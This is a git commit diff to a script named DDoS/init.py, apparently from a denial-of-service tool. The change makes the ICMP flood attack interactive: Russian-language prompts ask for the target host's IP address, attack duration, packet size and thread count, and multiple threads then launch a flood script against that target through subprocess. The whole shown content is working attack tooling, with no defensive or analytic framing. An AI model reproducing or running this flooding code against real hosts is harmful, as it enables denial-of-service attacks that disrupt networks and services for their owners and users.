8f62cc8cba8b0493ad33b7e8e9e38c55da524923
and4r1lh0 <kdevops32@gmail.com>
2023-12-10 17:51:05 +0400

    update v.1.6.12

--- DDoS/init.py
+++ DDoS/init.py
@@ -5,17 +5,17 @@ def send_ping(ip_dest,duration,packet_size):
     subprocess.run(f'python icmp_flood_args.py -target {ip_dest} -duration {duration} -size {packet_size}', stdout=subprocess.DEVNULL)
 
 def main():
-    ip_destination = '192.168.233.128'
-    duration = 120
-    sent_buff_size = 65500
-    num_threads = 5
+    ip_destination = str(input('IP - адрес атакуемого хоста: '))
+    duration = int(input('Продолжительность атаки (с): '))
+    sent_buff_size = int(input('Размер пакета (байт): '))
+    num_threads = int(input('Количество потоков: '))
 
     threads = []
     for i in range(num_threads):
         thread = threading.Thread(target=send_ping, args=(ip_destination,duration,sent_buff_size))
         threads.append(thread)
         thread.start()
-    print('Running')
+    print('\nRunning')
     for thread in threads:
         thread.join()
 
